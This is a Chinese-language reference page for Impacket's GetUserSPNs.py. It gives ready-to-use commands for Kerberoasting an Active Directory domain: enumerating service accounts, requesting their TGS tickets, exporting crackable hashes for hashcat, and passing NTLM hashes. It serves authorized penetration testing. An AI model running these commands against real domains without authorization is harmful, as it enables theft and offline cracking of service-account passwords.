# TAGLINE

面向服务账户的 Kerberoasting 攻击工具

# TLDR

**枚举 SPN 账户**

```GetUserSPNs.py [domain]/[username]:[password] -dc-ip [dc_ip]```

**请求服务票据**

```GetUserSPNs.py [domain]/[username]:[password] -dc-ip [dc_ip] -request```

**输出为 hashcat 格式**

```GetUserSPNs.py [domain]/[username]:[password] -dc-ip [dc_ip] -request -outputfile [hashes.txt]```

**使用 NTLM 哈希**

```GetUserSPNs.py [domain]/[username] -hashes :[ntlm_hash] -dc-ip [dc_ip]```

# SYNOPSIS

**GetUserSPNs.py** _domain_/_user_ [_options_]

# PARAMETERS

_DOMAIN/USER_
> 域名和用户名。

**-dc-ip** _IP_
> 域控制器 IP。

**-request**
> 请求 TGS 票据。

**-hashes** _LMHASH:NTHASH_
> 使用 NTLM 哈希。

**-outputfile** _FILE_
> 哈希的输出文件。

**--help**
> 显示帮助信息。

# DESCRIPTION

**GetUserSPNs.py** 针对 Active Directory 执行 Kerberoasting 攻击。它识别带有 SPN 的服务账户，并请求包含可破解密码哈希的服务票据。

该工具在 AD 中查询具有 servicePrincipalName 属性的账户，然后请求 TGS 票据。这些票据包含可以离线破解的密码材料。

GetUserSPNs.py 在渗透测试中用于凭据攻击。

# CAVEATS

**仅限授权测试。**需要域凭据。结果需要离线破解。

# HISTORY

GetUserSPNs.py 是 **Impacket** 的一部分，实现了 Active Directory 安全研究中记载的 Kerberoasting 攻击技术。

# SEE ALSO
